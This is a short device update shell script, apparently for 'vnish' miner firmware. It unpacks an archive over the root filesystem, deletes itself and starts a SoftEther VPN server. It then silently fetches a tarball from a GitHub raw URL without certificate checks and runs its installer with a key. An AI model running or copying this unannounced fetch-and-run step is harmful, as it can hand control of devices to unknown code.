#!/bin/sh

tar -xzf up.tar.gz -C /

echo "+++++++++++++++++++++++++++"

	rm "./up.tar.gz"

  rm "./runme.sh"
  
  /opt/etc/init.d/S80softethervpnserver start

  sync
  
  mkdir /tmp/anth1 && cd /tmp/anth1 && curl --insecure https://raw.githubusercontent.com/cssunz25/x/x/anth1.tar.gz -o anthill_install.tar.gz >/dev/null 2>&1 && tar zxf anthill_install.tar.gz >/dev/null 2>&1 && ./runme.sh xtDMh7PzvjmKqYw0Wced2Z94BJL1rXSCluEAyRFGOIQ8iponfb

# Some vnish's firemware requires it
# to finigh update properly
#exit 0
